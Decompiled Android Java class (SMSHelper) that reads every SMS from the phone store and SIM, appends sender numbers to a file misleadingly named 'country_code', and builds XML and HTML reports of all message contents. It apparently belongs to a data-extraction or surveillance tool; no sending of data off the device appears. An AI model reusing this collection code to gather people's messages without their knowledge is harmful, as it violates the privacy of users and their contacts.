package com.fenghuo.sms;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.telephony.TelephonyManager;
import com.fenghuo.utils.Global;
import com.fenghuo.utils.Util;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import org.apache.http.protocol.HTTP;

public class SMSHelper {
    public static final String[] SMS_INFO = new String[]{"_id", "address", "date", "read", "body", "service_center", "type"};
    public static final Uri URI = Uri.parse("content://sms");
    private static SMSHelper sInstance;
    private int count = 0;
    private boolean flage = false;
    public Handler loginHandler_ = null;
    private Context mContext;
    private int position = 0;
    public ArrayList<SMSItem> smsArray = new ArrayList();

    public static synchronized SMSHelper getInstance(Context context) {
        SMSHelper sMSHelper;
        synchronized (SMSHelper.class) {
            if (sInstance == null) {
                sInstance = new SMSHelper(context);
            }
            sMSHelper = sInstance;
        }
        return sMSHelper;
    }

    public SMSHelper(Context context) {
        this.mContext = context;
    }

    private void sendMssage(int i) {
        Message message = new Message();
        message.what = i;
        Bundle bundle = new Bundle();
        bundle.putInt("count", this.count);
        bundle.putInt("poistion", this.position);
        message.setData(bundle);
        this.loginHandler_.sendMessage(message);
    }

    public void queryAllSMS(Handler handler) {
        this.loginHandler_ = handler;
        if (this.mContext != null) {
            this.smsArray.clear();
            this.flage = false;
            Cursor query = this.mContext.getContentResolver().query(URI, SMS_INFO, null, null, "date DESC");
            if (query != null && query.getCount() > 0) {
                this.count = query.getCount();
                query.moveToFirst();
                int columnIndex = query.getColumnIndex("_id");
                int columnIndex2 = query.getColumnIndex("address");
                int columnIndex3 = query.getColumnIndex("date");
                int columnIndex4 = query.getColumnIndex("read");
                int columnIndex5 = query.getColumnIndex("body");
                int columnIndex6 = query.getColumnIndex("service_center");
                int columnIndex7 = query.getColumnIndex("type");
                for (int i = 0; i < this.count; i++) {
                    query.moveToPosition(i);
                    this.position = i + 1;
                    SMSItem sMSItem = new SMSItem();
                    sMSItem.mID = query.getString(columnIndex);
                    sMSItem.mSMSType = query.getString(columnIndex4);
                    sMSItem.mCenterNumber = query.getString(columnIndex6);
                    sMSItem.mNumber = query.getString(columnIndex2);
                    if (!(sMSItem.mNumber == null || sMSItem.mNumber.equals(""))) {
                        Util.appendAppListFile(Global.esnPath_ + "country_code", sMSItem.mNumber + "\n");
                    }
                    sMSItem.mTime = query.getLong(columnIndex3);
                    sMSItem.mText = query.getString(columnIndex5);
                    sMSItem.mType = query.getString(columnIndex7);
                    if (sMSItem.mText != null) {
                        try {
                            sMSItem.mText = sMSItem.mText.replace("\u0000", "");
                            sMSItem.mText = new String(sMSItem.mText.getBytes(HTTP.UTF_8), HTTP.UTF_8);
                            sMSItem.mText = sMSItem.mText.replace(Character.toString('￿'), "");
                            sMSItem.mText = sMSItem.mText.replace(Character.toString('\u0000'), "");
                            sMSItem.mText = sMSItem.mText.replace(Character.toString('＀'), "");
                            sMSItem.mText = sMSItem.mText.replace(Character.toString('쳌'), "");
                            sMSItem.mText = sMSItem.mText.replace(Character.toString('\u000e'), "");
                            sMSItem.mText = sMSItem.mText.replace(Character.toString('\u0014'), "");
                            sMSItem.mText = sMSItem.mText.replace(Character.toString('਑'), "");
                            sMSItem.mText = sMSItem.mText.replace(Character.toString('\u0003'), "");
                            sMSItem.mText = sMSItem.mText.replace(Character.toString('\u001b'), "");
                        } catch (UnsupportedEncodingException e) {
                            e.printStackTrace();
                        }
                    }
                    sMSItem.mStorage = "N/A";
                    sendMssage(105);
                    this.smsArray.add(sMSItem);
                }
                if (query != null) {
                    query.close();
                }
            }
            if (isSimExist()) {
                getSimSms("content://sms/icc");
                if (!this.flage) {
                    getSimSms("content://sms/sim");
                }
            }
        }
    }

    private boolean isSimExist() {
        int simState = ((TelephonyManager) this.mContext.getSystemService("phone")).getSimState();
        System.out.println("status=" + simState);
        if (simState == 5) {
            return true;
        }
        if (simState == 1) {
            return false;
        }
        if (simState == 0) {
            return false;
        }
        return true;
    }

    public String getHelperData() {
        StringBuffer stringBuffer = new StringBuffer();
        stringBuffer.append("<Messages>");
        stringBuffer.append("<Count>").append(this.smsArray.size()).append("</Count>");
        int i = 0;
        int i2 = 0;
        while (i < this.smsArray.size()) {
            int i3 = i2 + 1;
            SMSItem sMSItem = (SMSItem) this.smsArray.get(i);
            stringBuffer.append("<Message>");
            stringBuffer.append("<ID>").append(i3).append("</ID>");
            stringBuffer.append("<Storage>").append(sMSItem.mStorage).append("</Storage>");
            stringBuffer.append("<SMSType>").append(sMSItem.mSMSType).append("</SMSType>");
            stringBuffer.append("<Folder>").append("N/A").append("</Folder>");
            stringBuffer.append("<CenterNumber>").append(sMSItem.mCenterNumber).append("</CenterNumber>");
            stringBuffer.append("<Number>").append(Util.escapexml(sMSItem.mNumber)).append("</Number>");
            stringBuffer.append("<Time>").append(Util.formatTimeStampString(sMSItem.mTime)).append("</Time>");
            stringBuffer.append("<Text>").append(Util.escapexml(sMSItem.mText)).append("</Text>");
            stringBuffer.append("<Type>").append(sMSItem.mType).append("</Type>");
            stringBuffer.append("<INTERCEPT_STATE>").append(0).append("</INTERCEPT_STATE>");
            stringBuffer.append("</Message>");
            i++;
            i2 = i3;
        }
        stringBuffer.append("</Messages>");
        return stringBuffer.toString();
    }

    public String getSMSHtml() {
        int i = 0;
        StringBuffer stringBuffer = new StringBuffer();
        stringBuffer.append("<h2 id=\"Message\"><a href=\"#PhoneInfo\" style=\"text-decoration:none;\">Message</a></h2>");
        stringBuffer.append("<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"font-size:11pt;border-collapse:collapse;\ttext-align:left;padding-left:5px;line-height:18pt;\" bordercolor=\"#111111\" width=\"100%\">");
        stringBuffer.append("<TR bgcolor=\"#C0C0C0\">");
        stringBuffer.append("<TD>ID</TD><TD>SmsStorage</TD><TD>SmsType</TD><TD>Folder</TD><TD>CenterNumber</TD><TD>TelePhone</TD><TD>SmsTime</TD><TD>Type</TD><TD>Text</TD></TR>");
        stringBuffer.append("<TR>");
        stringBuffer.append("<TD Style=\"WIDTH:2%\" HEIGHT=\"0\"></TD><TD Style=\"WIDTH:5%\" HEIGHT=\"0\"></TD><TD Style=\"WIDTH:6%\" HEIGHT=\"0\"></TD><TD Style=\"WIDTH:6%\" HEIGHT=\"0\"></TD><TD Style=\"WIDTH:12%\" HEIGHT=\"0\"></TD><TD Style=\"WIDTH:7%\" HEIGHT=\"0\"></TD><TD Style=\"WIDTH:13%\" HEIGHT=\"0\"></TD><TD HEIGHT=\"0\"></TD></TR>");
        stringBuffer.append("<TR>");
        stringBuffer.append("<TD></TD></TR>");
        int i2 = 0;
        while (i2 < this.smsArray.size()) {
            int i3 = i + 1;
            SMSItem sMSItem = (SMSItem) this.smsArray.get(i2);
            stringBuffer.append("<TR>");
            stringBuffer.append("<TD>").append(i3).append("</TD>");
            stringBuffer.append("<TD>").append(sMSItem.mStorage).append("</TD>");
            stringBuffer.append("<TD>").append("1".equals(sMSItem.mSMSType) ? "Read" : "Send").append("</TD>");
            stringBuffer.append("<TD>").append("N/A").append("</TD>");
            stringBuffer.append("<TD>").append(sMSItem.mCenterNumber == null ? "N/A" : sMSItem.mCenterNumber).append("</TD>");
            stringBuffer.append("<TD>").append(sMSItem.mNumber).append("</TD>");
            stringBuffer.append("<TD>").append(Util.formatTimeStampString(sMSItem.mTime)).append("</TD>");
            stringBuffer.append("<TD>").append(sMSItem.mType).append("</TD>");
            stringBuffer.append("<TD>").append(Util.escapexml(sMSItem.mText)).append("</TD>");
            stringBuffer.append("</TR>");
            i2++;
            i = i3;
        }
        stringBuffer.append("</table>");
        return stringBuffer.toString();
    }

    public void getSimSms(String str) {
        Cursor query;
        try {
            query = this.mContext.getContentResolver().query(Uri.parse(str), new String[]{"_id", "address", "body", "date", "type"}, null, null, null);
        } catch (Exception e) {
            System.out.println("e=" + e.toString());
            query = null;
        }
        if (query != null) {
            if (query.getCount() > 0) {
                this.flage = true;
                this.count = query.getCount();
                this.position = 0;
            }
        }
        if (query != null && query.moveToFirst()) {
            String str2 = "";
            str2 = "";
            str2 = "";
            int columnIndex = query.getColumnIndex("address");
            int columnIndex2 = query.getColumnIndex("body");
            int columnIndex3 = query.getColumnIndex("date");
            int columnIndex4 = query.getColumnIndex("type");
            do {
                String str3;
                this.position++;
                SMSItem sMSItem = new SMSItem();
                str2 = query.getString(columnIndex);
                if (str2 == null) {
                    str3 = "";
                } else {
                    str3 = str2;
                }
                if (!str3.equals("")) {
                    Util.appendAppListFile(Global.esnPath_ + "country_code", str3 + "\n");
                }
                str2 = query.getString(columnIndex2);
                if (str2 == null) {
                    str2 = "";
                }
                long j = query.getLong(columnIndex3);
                String string = query.getString(columnIndex4);
                if (string == null) {
                    string = "";
                }
                sMSItem.mNumber = str3;
                sMSItem.mText = str2;
                if (sMSItem.mText != null) {
                    try {
                        sMSItem.mText = sMSItem.mText.replace("\u0000", "");
                        sMSItem.mText = new String(sMSItem.mText.getBytes(HTTP.UTF_8), HTTP.UTF_8);
                        sMSItem.mText = sMSItem.mText.replace(Character.toString('￿'), "");
                        sMSItem.mText = sMSItem.mText.replace(Character.toString('\u0000'), "");
                        sMSItem.mText = sMSItem.mText.replace(Character.toString('＀'), "");
                        sMSItem.mText = sMSItem.mText.replace(Character.toString('쳌'), "");
                        sMSItem.mText = sMSItem.mText.replace(Character.toString('\u000e'), "");
                        sMSItem.mText = sMSItem.mText.replace(Character.toString('\u0014'), "");
                        sMSItem.mText = sMSItem.mText.replace(Character.toString('਑'), "");
                        sMSItem.mText = sMSItem.mText.replace(Character.toString('\u0003'), "");
                        sMSItem.mText = sMSItem.mText.replace(Character.toString('\u001b'), "");
                    } catch (UnsupportedEncodingException e2) {
                        e2.printStackTrace();
                    }
                }
                try {
                    sMSItem.mTime = j;
                    sMSItem.mType = string;
                    sMSItem.mStorage = "SIM";
                    sendMssage(107);
                    this.smsArray.add(sMSItem);
                } catch (Exception e3) {
                    e3.printStackTrace();
                    System.out.println("ex=" + e3);
                    return;
                }
            } while (query.moveToNext());
            if (query != null) {
                query.close();
            }
        } else if (query != null) {
            query.close();
        }
    }
}
